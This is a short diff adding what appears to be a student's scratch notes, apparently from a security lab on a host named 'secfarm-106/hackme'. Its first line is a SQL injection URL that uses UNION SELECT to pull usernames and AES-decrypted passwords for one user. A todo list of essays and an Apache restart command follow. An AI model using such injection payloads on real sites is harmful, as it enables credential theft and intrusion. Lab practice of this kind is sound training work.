@@ -1,0 +1,12 @@
+http://secfarm-106/hackme/show.php?pid=22'UNION SELECT username, AES_DECRYPT(pass, '4853'), pass, fname, lname FROM users WHERE username = "jungle5"'
+
+
+
+Todo:
+M1: Essay
+M2: Complete
+M3: Essay
+M4: Essay 
+
+
+sudo service apache2 restart
